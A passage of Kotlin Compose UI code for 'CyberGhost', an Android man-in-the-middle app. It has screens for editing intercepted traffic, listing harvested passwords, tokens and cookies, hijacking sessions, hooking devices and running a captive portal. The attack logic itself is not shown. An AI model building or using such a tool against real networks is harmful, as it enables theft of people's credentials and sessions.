@file:OptIn(ExperimentalLayoutApi::class, ExperimentalMaterial3Api::class)
package com.cyberghost.ui

import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.TextFieldValue
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.cyberghost.core.*

// ============================
// THEME
// ============================
val CgGreen = Color(0xFF00FF41)
val CgDimGreen = Color(0xFF00AA2A)
val CgCyan = Color(0xFF00D4FF)
val CgAmber = Color(0xFFFFB000)
val CgRed = Color(0xFFFF3333)
val CgMagenta = Color(0xFFFF44FF)
val CgBg = Color(0xFF0A0A0F)
val CgSurface = Color(0xFF12121A)
val CgCard = Color(0xFF1A1A25)
val CgGray = Color(0xFF6B6B80)
val CgWhite = Color(0xFFE0E0EC)
val CgBlue = Color(0xFF4488FF)
val CgPurple = Color(0xFF9966FF)

val CgColors = darkColorScheme(
    background = CgBg, surface = CgSurface, surfaceVariant = CgCard,
    primary = CgGreen, secondary = CgCyan, tertiary = CgAmber,
    error = CgRed, onBackground = CgWhite, onSurface = CgWhite,
    onPrimary = CgBg, onSecondary = CgBg, outline = CgGray,
    surfaceContainerHigh = CgCard
)

@Composable
fun CyberGhostTheme(content: @Composable () -> Unit) {
    MaterialTheme(colorScheme = CgColors, content = content)
}

enum class Screen { SETUP,
    DASHBOARD, INTERCEPT, CREDENTIALS, DEVICES, HOOKED,
    NETWORK, STATS, HIJACK, CAPTIVE, WEBSOCKET, SETTINGS, ABOUT
}

// ============================
// ROOT APP
// ============================
@Composable
fun CyberGhostApp(
    interceptQueue: List<PendingIntercept>,
    packets: List<InterceptedPacket>,
    devices: List<ConnectedDevice>,
    hookedSessions: List<HookedSession>,
    mode: InterceptMode,
    isRunning: Boolean,
    events: List<C2Event>,
    networkHosts: List<NetworkHost>,
    isScanning: Boolean,
    trafficStats: TrafficStats,
    profiles: List<String>,
    certInfos: Map<String, CertInfo>,
    credentials: List<HarvestedCredential>,
    currentConfig: InjectionConfig,
    hijackSessions: List<HijackSession>,
    captiveEntries: List<CaptiveEntry>,
    captiveConfig: CaptiveConfig,
    wsFrames: List<WebSocketFrame>,
    savedSessions: List<String>,
    autoStartEnabled: Boolean,
    onModeChange: (InterceptMode) -> Unit,
    onToggle: () -> Unit,
    onForward: (String, InterceptedPacket) -> Unit,
    onDrop: (String) -> Unit,
    onCommand: (String, String, Map<String, Any?>) -> Unit,
    onExportCa: () -> Unit,
    onExportHar: () -> Unit,
    onConfigUpdate: (InjectionConfig) -> Unit,
    onScanNetwork: () -> Unit,
    onSaveProfile: (String) -> Unit,
    onLoadProfile: (String) -> Unit,
    onDeleteProfile: (String) -> Unit,
    onSetNickname: (String, String) -> Unit,
    onInspectCert: (String) -> Unit,
    onClearCredentials: () -> Unit,
    onHijackSession: (HijackSession) -> Unit,
    onRemoveHijack: (String) -> Unit,
    onUpdateCaptiveConfig: (CaptiveConfig) -> Unit,
    onSaveSession: () -> Unit,
    onDeleteSession: (String) -> Unit,
    onShareSession: (String) -> Unit,
    onToggleAutoStart: (Boolean) -> Unit,
    gatewayIp: String = "192.168.43.1"
) {
    var currentScreen by remember { mutableStateOf(Screen.DASHBOARD) }
    var searchQuery by remember { mutableStateOf("") }
    val newCredCount = remember { mutableStateOf(0) }

    LaunchedEffect(credentials.size) {
        if (credentials.size > newCredCount.value) newCredCount.value = credentials.size
    }

    Scaffold(
        bottomBar = {
            NavigationBar(containerColor = CgSurface, tonalElevation = 0.dp) {
                NavItem(Screen.DASHBOARD, currentScreen, Icons.Filled.Dashboard, "Home") { currentScreen = it }
                NavItem(Screen.INTERCEPT, currentScreen, Icons.Filled.SwapVert, "Traffic") { currentScreen = it }
                NavItem(Screen.CREDENTIALS, currentScreen, Icons.Filled.Key, "Creds", badge = if (credentials.isNotEmpty()) "${credentials.size}" else null) { currentScreen = it }
                NavItem(Screen.DEVICES, currentScreen, Icons.Filled.Devices, "Devices") { currentScreen = it }
                NavItem(Screen.SETTINGS, currentScreen, Icons.Filled.MoreHoriz, "More") { currentScreen = it }
            }
        }
    ) { padding ->
        Box(Modifier.fillMaxSize().background(CgBg).padding(padding)) {
            when (currentScreen) {
                Screen.DASHBOARD -> DashboardScreen(isRunning, onToggle, devices, hookedSessions, trafficStats, packets, credentials, captiveEntries, onExportHar) { currentScreen = it }
                Screen.INTERCEPT -> InterceptScreen(interceptQueue, packets, searchQuery, { searchQuery = it }, onForward, onDrop, onInspectCert)
                Screen.CREDENTIALS -> CredentialsScreen(credentials, onClearCredentials) { currentScreen = Screen.HIJACK }
                Screen.DEVICES -> DevicesScreen(devices, onSetNickname)
                Screen.HOOKED -> HookedScreen(hookedSessions, events, onCommand)
                Screen.NETWORK -> NetworkMapScreen(networkHosts, isScanning, onScanNetwork)
                Screen.STATS -> StatsScreen(trafficStats)
                Screen.HIJACK -> HijackScreen(hijackSessions, onHijackSession, onRemoveHijack)
                Screen.CAPTIVE -> CaptiveScreen(captiveConfig, captiveEntries, onUpdateCaptiveConfig)
                Screen.WEBSOCKET -> WebSocketScreen(wsFrames)
                Screen.SETTINGS -> SettingsScreen(mode, onModeChange, currentConfig, onConfigUpdate, profiles, onSaveProfile, onLoadProfile, onDeleteProfile, onExportCa, savedSessions, onSaveSession, onDeleteSession, onShareSession, autoStartEnabled, onToggleAutoStart) { currentScreen = it }
                Screen.ABOUT -> AboutScreen()
                Screen.SETUP -> SetupScreen(gatewayIp = gatewayIp, isRunning = isRunning)
            }
        }
    }
}

@Composable
fun RowScope.NavItem(screen: Screen, current: Screen, icon: ImageVector, label: String, badge: String? = null, onSelect: (Screen) -> Unit) {
    NavigationBarItem(
        icon = {
            BadgedBox(badge = { badge?.let { Badge(containerColor = CgRed) { Text(it, fontSize = 8.sp) } } }) {
                Icon(icon, contentDescription = label, modifier = Modifier.size(22.dp))
            }
        },
        label = { Text(label, fontSize = 10.sp) },
        selected = current == screen,
        onClick = { onSelect(screen) },
        colors = NavigationBarItemDefaults.colors(
            selectedIconColor = CgGreen, selectedTextColor = CgGreen,
            unselectedIconColor = CgGray, unselectedTextColor = CgGray,
            indicatorColor = CgGreen.copy(alpha = 0.1f)
        )
    )
}

// ============================
// DASHBOARD
// ============================
@Composable
fun DashboardScreen(
    isRunning: Boolean, onToggle: () -> Unit,
    devices: List<ConnectedDevice>, hookedSessions: List<HookedSession>,
    stats: TrafficStats, packets: List<InterceptedPacket>,
    credentials: List<HarvestedCredential>, captiveEntries: List<CaptiveEntry>,
    onExportHar: () -> Unit, navigateTo: (Screen) -> Unit
) {
    val pulseAnim = rememberInfiniteTransition(label = "pulse")
    val pulseAlpha by pulseAnim.animateFloat(
        initialValue = 0.4f, targetValue = 1f,
        animationSpec = infiniteRepeatable(tween(1000), RepeatMode.Reverse), label = "alpha"
    )

    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
        item {
            // header
            Box(Modifier.fillMaxWidth().clip(RoundedCornerShape(16.dp)).background(
                Brush.linearGradient(listOf(CgGreen.copy(0.15f), CgCyan.copy(0.05f)))
            ).padding(20.dp)) {
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                    Column {
                        Text("CYBERGHOST", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = CgGreen, letterSpacing = 3.sp)
                        Text("Active MITM Framework v2.0", fontSize = 11.sp, color = CgGray)
                        Spacer(Modifier.height(4.dp))
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Box(Modifier.size(8.dp).clip(CircleShape).background(
                                if (isRunning) CgGreen.copy(pulseAlpha) else CgRed
                            ))
                            Spacer(Modifier.width(6.dp))
                            Text(if (isRunning) "INTERCEPTING" else "OFFLINE", fontSize = 11.sp,
                                color = if (isRunning) CgGreen else CgRed, fontWeight = FontWeight.Bold, letterSpacing = 1.sp)
                        }
                    }
                    Button(
                        onClick = onToggle,
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isRunning) CgRed.copy(0.2f) else CgGreen.copy(0.2f)
                        ),
                        shape = RoundedCornerShape(14.dp),
                        border = BorderStroke(1.dp, if (isRunning) CgRed.copy(0.5f) else CgGreen.copy(0.5f))
                    ) {
                        Icon(if (isRunning) Icons.Filled.Stop else Icons.Filled.PlayArrow,
                            contentDescription = null, tint = if (isRunning) CgRed else CgGreen, modifier = Modifier.size(18.dp))
                        Spacer(Modifier.width(6.dp))
                        Text(if (isRunning) "STOP" else "START", color = if (isRunning) CgRed else CgGreen, fontWeight = FontWeight.Bold, fontSize = 13.sp)
                    }
                }
            }
        }

        // stat grid
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                StatCard("Devices", "${devices.size}", CgCyan, Icons.Filled.Devices, Modifier.weight(1f)) { navigateTo(Screen.DEVICES) }
                StatCard("Hooked", "${hookedSessions.count { it.isAlive }}", CgMagenta, Icons.Filled.Phishing, Modifier.weight(1f)) { navigateTo(Screen.HOOKED) }
            }
        }
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                StatCard("Creds", "${credentials.size}", CgRed, Icons.Filled.Key, Modifier.weight(1f)) { navigateTo(Screen.CREDENTIALS) }
                StatCard("Captive", "${captiveEntries.size}", CgAmber, Icons.Filled.Wifi, Modifier.weight(1f)) { navigateTo(Screen.CAPTIVE) }
            }
        }
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                StatCard("Packets", "${stats.totalPackets.get()}", CgBlue, Icons.Filled.SwapVert, Modifier.weight(1f)) { navigateTo(Screen.INTERCEPT) }
                StatCard("Traffic", formatBytes(stats.totalBytes.get()), CgPurple, Icons.Filled.DataUsage, Modifier.weight(1f)) { navigateTo(Screen.STATS) }
            }
        }

        // protocol breakdown
        item {
            CgCard {
                Text("Protocol Breakdown", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                Spacer(Modifier.height(10.dp))
                ProtocolBar("HTTP", stats.protocol.httpCount, CgAmber, stats.totalPackets.get())
                Spacer(Modifier.height(6.dp))
                ProtocolBar("HTTPS", stats.protocol.httpsCount, CgCyan, stats.totalPackets.get())
                Spacer(Modifier.height(6.dp))
                ProtocolBar("DNS", stats.protocol.dnsCount, CgMagenta, stats.totalPackets.get())
            }
        }

        // quick actions
        item { SectionLabel("Quick Actions") }
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                ActionTile("Network\nMap", Icons.Filled.Radar, CgCyan, Modifier.weight(1f)) { navigateTo(Screen.NETWORK) }
                ActionTile("Session\nHijack", Icons.Filled.Lock, CgRed, Modifier.weight(1f)) { navigateTo(Screen.HIJACK) }
                ActionTile("Captive\nPortal", Icons.Filled.Wifi, CgAmber, Modifier.weight(1f)) { navigateTo(Screen.CAPTIVE) }
                ActionTile("WS\nFrames", Icons.Filled.Cable, CgPurple, Modifier.weight(1f)) { navigateTo(Screen.WEBSOCKET) }
            }
        }
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                ActionTile("Stats", Icons.Filled.BarChart, CgBlue, Modifier.weight(1f)) { navigateTo(Screen.STATS) }
                ActionTile("Export\nHAR", Icons.Filled.FileDownload, CgDimGreen, Modifier.weight(1f), onExportHar)
                ActionTile("Settings", Icons.Filled.Settings, CgGray, Modifier.weight(1f)) { navigateTo(Screen.SETTINGS) }
                ActionTile("Setup", Icons.Filled.HelpOutline, CgGreen, Modifier.weight(1f)) { navigateTo(Screen.SETUP) }
            }
        }

        // recent credentials alert
        if (credentials.isNotEmpty()) {
            item { SectionLabel("Latest Credential") }
            item {
                val latest = credentials.last()
                Card(Modifier.fillMaxWidth().clickable { navigateTo(Screen.CREDENTIALS) },
                    colors = CardDefaults.cardColors(containerColor = CgRed.copy(0.08f)),
                    shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, CgRed.copy(0.3f))) {
                    Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Filled.Warning, contentDescription = null, tint = CgRed, modifier = Modifier.size(20.dp))
                        Spacer(Modifier.width(10.dp))
                        Column(Modifier.weight(1f)) {
                            Text(latest.host, fontSize = 13.sp, color = CgWhite, fontWeight = FontWeight.SemiBold)
                            latest.username?.let { Text("User: $it", fontSize = 11.sp, color = CgRed) }
                            latest.password?.let { Text("Pass: $it", fontSize = 11.sp, color = CgAmber) }
                        }
                        Icon(Icons.Filled.ChevronRight, contentDescription = null, tint = CgGray, modifier = Modifier.size(16.dp))
                    }
                }
            }
        }

        // recent activity
        if (packets.isNotEmpty()) {
            item { SectionLabel("Recent Traffic") }
            items(packets.takeLast(8).reversed()) { pkt -> CompactPacketRow(pkt) }
        }
    }
}

@Composable
fun CgCard(content: @Composable ColumnScope.() -> Unit) {
    Card(colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp), modifier = Modifier.fillMaxWidth()) {
        Column(Modifier.padding(14.dp), content = content)
    }
}

@Composable
fun SectionLabel(text: String) {
    Text(text, fontSize = 12.sp, fontWeight = FontWeight.SemiBold, color = CgGray, modifier = Modifier.padding(vertical = 2.dp))
}

@Composable
fun StatCard(label: String, value: String, color: Color, icon: ImageVector, modifier: Modifier = Modifier, onClick: () -> Unit = {}) {
    Card(modifier = modifier.clickable(onClick = onClick), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
        Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
            Box(Modifier.size(36.dp).clip(RoundedCornerShape(8.dp)).background(color.copy(0.15f)), contentAlignment = Alignment.Center) {
                Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(18.dp))
            }
            Spacer(Modifier.width(8.dp))
            Column {
                Text(value, fontSize = 17.sp, fontWeight = FontWeight.Bold, color = color)
                Text(label, fontSize = 10.sp, color = CgGray)
            }
        }
    }
}

@Composable
fun ActionTile(label: String, icon: ImageVector, color: Color, modifier: Modifier = Modifier, onClick: () -> Unit) {
    Card(modifier = modifier.clickable(onClick = onClick).height(70.dp), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(10.dp)) {
        Column(Modifier.fillMaxSize().padding(8.dp), horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.Center) {
            Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(18.dp))
            Spacer(Modifier.height(4.dp))
            Text(label, fontSize = 9.sp, color = CgWhite, fontWeight = FontWeight.Medium, textAlign = androidx.compose.ui.text.style.TextAlign.Center, lineHeight = 12.sp)
        }
    }
}

@Composable
fun ProtocolBar(label: String, count: Long, color: Color, total: Long) {
    val fraction = if (total > 0) count.toFloat() / total.toFloat() else 0f
    Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
        Text(label, fontSize = 11.sp, color = CgGray, modifier = Modifier.width(48.dp))
        Box(Modifier.weight(1f).height(8.dp).clip(RoundedCornerShape(4.dp)).background(CgBg)) {
            Box(Modifier.fillMaxHeight().fillMaxWidth(fraction.coerceIn(0f, 1f)).clip(RoundedCornerShape(4.dp)).background(color))
        }
        Spacer(Modifier.width(8.dp))
        Text("$count", fontSize = 11.sp, color = color, modifier = Modifier.width(40.dp))
    }
}

@Composable
fun CompactPacketRow(pkt: InterceptedPacket) {
    val color = when { pkt.protocol == "HTTPS" -> CgCyan; pkt.isRequest -> CgAmber; else -> CgDimGreen }
    Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), verticalAlignment = Alignment.CenterVertically) {
        Box(Modifier.size(6.dp).clip(CircleShape).background(color))
        Spacer(Modifier.width(8.dp))
        Text("${pkt.method ?: ""} ", fontSize = 11.sp, color = color, fontWeight = FontWeight.Bold)
        Text("${pkt.host}${pkt.path.take(28)}", fontSize = 11.sp, color = CgWhite.copy(0.7f), maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
        Text(pkt.protocol, fontSize = 9.sp, color = color.copy(0.5f))
    }
}

// ============================
// INTERCEPT SCREEN
// ============================
@Composable
fun InterceptScreen(
    queue: List<PendingIntercept>, history: List<InterceptedPacket>,
    searchQuery: String, onSearchChange: (String) -> Unit,
    onForward: (String, InterceptedPacket) -> Unit, onDrop: (String) -> Unit,
    onInspectCert: (String) -> Unit
) {
    Column(Modifier.fillMaxSize()) {
        OutlinedTextField(
            value = searchQuery, onValueChange = onSearchChange,
            placeholder = { Text("Filter host, method, path...", fontSize = 12.sp) },
            leadingIcon = { Icon(Icons.Filled.Search, contentDescription = null, tint = CgGray, modifier = Modifier.size(18.dp)) },
            modifier = Modifier.fillMaxWidth().padding(12.dp).height(48.dp),
            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 12.sp, color = CgWhite),
            singleLine = true, shape = RoundedCornerShape(10.dp),
            colors = OutlinedTextFieldDefaults.colors(unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = CgGreen, unfocusedContainerColor = CgCard, focusedContainerColor = CgCard)
        )
        val filtered = if (searchQuery.isBlank()) history else history.filter { pkt ->
            val q = searchQuery.lowercase()
            pkt.host.lowercase().contains(q) || (pkt.method ?: "").lowercase().contains(q) || pkt.path.lowercase().contains(q)
        }
        LazyColumn(Modifier.fillMaxSize().padding(horizontal = 12.dp)) {
            if (queue.isNotEmpty()) {
                item { SectionLabel("Pending (${queue.size})") }
                items(queue) { pending ->
                    InterceptCard(pending.packet, true, { onForward(pending.packet.id, it) }, { onDrop(pending.packet.id) })
                }
            }
            item { SectionLabel("History (${filtered.size})") }
            items(filtered.takeLast(300).reversed()) { pkt ->
                PacketCard(pkt) { onInspectCert(pkt.host) }
            }
        }
    }
}

@Composable
fun InterceptCard(packet: InterceptedPacket, isPending: Boolean, onForward: (InterceptedPacket) -> Unit, onDrop: () -> Unit) {
    var editedBody by remember { mutableStateOf(TextFieldValue(String(packet.body))) }
    var editedPath by remember { mutableStateOf(TextFieldValue(packet.path)) }
    val color = if (packet.isRequest) CgCyan else CgAmber

    Card(Modifier.fillMaxWidth().padding(vertical = 4.dp),
        colors = CardDefaults.cardColors(containerColor = color.copy(0.06f)),
        shape = RoundedCornerShape(10.dp), border = BorderStroke(1.dp, color.copy(0.3f))) {
        Column(Modifier.padding(12.dp)) {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                Text("${packet.direction.name} · ${packet.protocol}", fontSize = 11.sp, color = color, fontWeight = FontWeight.Bold)
                Text(packet.sourceIp, fontSize = 10.sp, color = CgGray)
            }
            Spacer(Modifier.height(6.dp))
            Text("${packet.method ?: ""} ${packet.host}${packet.path}", fontSize = 11.sp, color = CgWhite, maxLines = 2)
            Spacer(Modifier.height(8.dp))
            if (isPending) {
                OutlinedTextField(value = editedPath, onValueChange = { editedPath = it },
                    label = { Text("Path", fontSize = 10.sp) },
                    textStyle = androidx.compose.ui.text.TextStyle(fontSize = 11.sp, color = CgWhite, fontFamily = FontFamily.Monospace),
                    modifier = Modifier.fillMaxWidth(), singleLine = true, shape = RoundedCornerShape(8.dp),
                    colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = color))
                Spacer(Modifier.height(6.dp))
                OutlinedTextField(value = editedBody, onValueChange = { editedBody = it },
                    label = { Text("Body", fontSize = 10.sp) },
                    textStyle = androidx.compose.ui.text.TextStyle(fontSize = 10.sp, color = CgDimGreen, fontFamily = FontFamily.Monospace),
                    modifier = Modifier.fillMaxWidth().heightIn(min = 60.dp, max = 150.dp), shape = RoundedCornerShape(8.dp),
                    colors = OutlinedTextFieldDefaults.colors(unfocusedContainerColor = CgBg, focusedContainerColor = CgBg, unfocusedBorderColor = CgGray.copy(0.3f), focusedBorderColor = color))
                Spacer(Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    Button(onClick = { onForward(packet.copy(path = editedPath.text, body = editedBody.text.toByteArray())) },
                        colors = ButtonDefaults.buttonColors(containerColor = CgGreen.copy(0.2f)), shape = RoundedCornerShape(8.dp),
                        border = BorderStroke(1.dp, CgGreen.copy(0.4f))) { Text("Forward", color = CgGreen, fontSize = 12.sp) }
                    Button(onClick = onDrop, colors = ButtonDefaults.buttonColors(containerColor = CgRed.copy(0.2f)), shape = RoundedCornerShape(8.dp),
                        border = BorderStroke(1.dp, CgRed.copy(0.4f))) { Text("Drop", color = CgRed, fontSize = 12.sp) }
                }
            }
        }
    }
}

@Composable
fun PacketCard(pkt: InterceptedPacket, onTapHost: () -> Unit) {
    val color = when { pkt.protocol == "HTTPS" -> CgCyan; pkt.isRequest -> CgAmber; else -> CgDimGreen }
    var expanded by remember { mutableStateOf(false) }
    Card(Modifier.fillMaxWidth().padding(vertical = 2.dp).clickable { expanded = !expanded },
        colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(8.dp)) {
        Column(Modifier.padding(10.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(Modifier.size(6.dp).clip(CircleShape).background(color))
                Spacer(Modifier.width(6.dp))
                Text("${pkt.method ?: ""} ", fontSize = 11.sp, color = color, fontWeight = FontWeight.Bold)
                Text(pkt.host, fontSize = 11.sp, color = CgWhite.copy(0.8f), modifier = Modifier.clickable(onClick = onTapHost))
                Text(pkt.path.take(22), fontSize = 11.sp, color = CgGray, maxLines = 1, modifier = Modifier.weight(1f), overflow = TextOverflow.Ellipsis)
                pkt.statusCode?.let { Text("$it", fontSize = 10.sp, color = if (it < 400) CgDimGreen else CgRed) }
            }
            if (expanded) {
                Spacer(Modifier.height(6.dp))
                pkt.headers.entries.take(6).forEach { (k, v) ->
                    Text("$k: ${v.take(55)}", fontSize = 9.sp, color = CgGray, fontFamily = FontFamily.Monospace, maxLines = 1, overflow = TextOverflow.Ellipsis)
                }
                if (pkt.body.isNotEmpty()) {
                    Spacer(Modifier.height(4.dp))
                    Text(String(pkt.body).take(200), fontSize = 9.sp, color = CgDimGreen, fontFamily = FontFamily.Monospace, maxLines = 4, overflow = TextOverflow.Ellipsis)
                }
            }
        }
    }
}

// ============================
// CREDENTIALS SCREEN
// ============================
@Composable
fun CredentialsScreen(credentials: List<HarvestedCredential>, onClear: () -> Unit, onGoHijack: () -> Unit) {
    Column(Modifier.fillMaxSize()) {
        Row(Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 12.dp), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Column {
                Text("Credentials", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                Text("${credentials.size} captured", fontSize = 12.sp, color = if (credentials.isEmpty()) CgGray else CgRed)
            }
            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                if (credentials.isNotEmpty()) {
                    OutlinedButton(onClick = onGoHijack, shape = RoundedCornerShape(8.dp), border = BorderStroke(1.dp, CgCyan.copy(0.5f))) {
                        Text("Hijack", fontSize = 11.sp, color = CgCyan)
                    }
                    OutlinedButton(onClick = onClear, shape = RoundedCornerShape(8.dp), border = BorderStroke(1.dp, CgRed.copy(0.5f))) {
                        Text("Clear", fontSize = 11.sp, color = CgRed)
                    }
                }
            }
        }
        if (credentials.isEmpty()) {
            EmptyState(Icons.Filled.Key, "No credentials captured", "Start capture and wait for targets to log in")
        } else {
            LazyColumn(Modifier.fillMaxSize().padding(horizontal = 12.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                items(credentials.reversed()) { CredentialCard(it) }
            }
        }
    }
}

@Composable
fun CredentialCard(cred: HarvestedCredential) {
    val typeColor = when (cred.type) {
        CredentialType.FORM_LOGIN -> CgRed
        CredentialType.BASIC_AUTH -> CgAmber
        CredentialType.BEARER_TOKEN -> CgCyan
        CredentialType.JSON_LOGIN -> CgMagenta
        CredentialType.API_KEY -> CgBlue
        CredentialType.COOKIE_SESSION -> CgDimGreen
    }
    var expanded by remember { mutableStateOf(false) }
    Card(Modifier.fillMaxWidth().clickable { expanded = !expanded },
        colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp),
        border = BorderStroke(1.dp, typeColor.copy(0.25f))) {
        Column(Modifier.padding(14.dp)) {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                    Box(Modifier.size(8.dp).clip(CircleShape).background(typeColor))
                    Spacer(Modifier.width(8.dp))
                    Text(cred.host, fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = CgWhite, maxLines = 1, overflow = TextOverflow.Ellipsis)
                }
                Badge(containerColor = typeColor.copy(0.2f)) {
                    Text(cred.type.name.replace("_", " "), fontSize = 8.sp, color = typeColor, modifier = Modifier.padding(horizontal = 4.dp))
                }
            }
            Spacer(Modifier.height(8.dp))
            cred.username?.let { CredRow("User", it, CgCyan) }
            cred.password?.let { CredRow("Pass", it, CgRed) }
            cred.token?.let { CredRow("Token", it.take(40) + if (it.length > 40) "…" else "", CgAmber) }
            Text("${cred.sourceIp} · ${cred.protocol} · ${cred.path.take(30)}", fontSize = 9.sp, color = CgGray, modifier = Modifier.padding(top = 4.dp))
            if (expanded && cred.rawFields.isNotEmpty()) {
                Spacer(Modifier.height(8.dp))
                HorizontalDivider(color = CgGray.copy(0.2f))
                Spacer(Modifier.height(6.dp))
                cred.rawFields.entries.forEach { (k, v) ->
                    Text("$k: $v", fontSize = 9.sp, color = CgGray, fontFamily = FontFamily.Monospace, maxLines = 1, overflow = TextOverflow.Ellipsis)
                }
            }
        }
    }
}

@Composable
fun CredRow(label: String, value: String, color: Color) {
    Row(Modifier.padding(vertical = 1.dp)) {
        Text("$label: ", fontSize = 11.sp, color = CgGray, fontWeight = FontWeight.Medium)
        Text(value, fontSize = 11.sp, color = color, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis)
    }
}

// ============================
// DEVICES SCREEN
// ============================
@Composable
fun DevicesScreen(devices: List<ConnectedDevice>, onSetNickname: (String, String) -> Unit) {
    LazyColumn(Modifier.fillMaxSize().padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
        item {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Text("Connected Devices", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = CgWhite)
                Badge(containerColor = CgCyan.copy(0.2f)) { Text("${devices.size}", fontSize = 12.sp, color = CgCyan, modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)) }
            }
        }
        items(devices) { device -> DeviceCard(device, onSetNickname) }
    }
}

@Composable
fun DeviceCard(device: ConnectedDevice, onSetNickname: (String, String) -> Unit) {
    var showNickname by remember { mutableStateOf(false) }
    var nickname by remember { mutableStateOf(TextFieldValue(device.hostname ?: "")) }
    Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = CgCard), shape = RoundedCornerShape(12.dp)) {
        Column(Modifier.padding(14.dp)) {
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(Modifier.size(42.dp).clip(RoundedCornerShape(10.dp)).background(if (device.isHooked) CgMagenta.copy(0.15f) else CgCyan.copy(0.1f)), contentAlignment = Alignment.Center) {
                        Icon(Icons.Filled.PhoneAndroid, contentDescription = null, tint = if (device.isHooked) CgMagenta else CgCyan, modifier = Modifier.size(20.dp))
                    }
                    Spacer(Modifier.width(12.dp))
                    Column {
                        Text(device.hostname ?: device.ip, fontSize = 14.sp, fontWeight = FontWeight.SemiBold, color = CgWhite)
                        Text(device.ip, fontSize = 11.sp, color = CgGray)
                        device.userAgent?.let { Text(it.take(45), fontSize = 9.sp, color = CgGray.copy(0.6f), maxLines = 1, overflow = TextOverflow.Ellipsis) }
                    }
                }
                Column(horizontalAlignment = Alignment.End) {
                    if (device.isHooked) Badge(containerColor = CgMagenta) { Text("HOOKED", fontSize = 8.sp, color = CgBg, modifier = Modifier.padding(horizontal = 4.dp)) }
                    Spacer(Modifier.height(4.dp))
                    IconButton(onClick = { showNickname = !showNickname }, modifier = Modifier.size(24.dp)) {
                        Icon(Icons.Filled.Edit, contentDescription = null, tint = CgGray, modifier = Modifier.size(14.dp))
                    }
                }
            }
            Spacer(Modifier.height(6.dp))
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(16.dp)) {
                Text("Reqs: ${device.requestCount}", fontSize = 10.sp, color = CgGray)
                Text("Traffic: ${formatBytes(device.bytesTransferred)}", fontSize = 10.sp, color = CgGray)
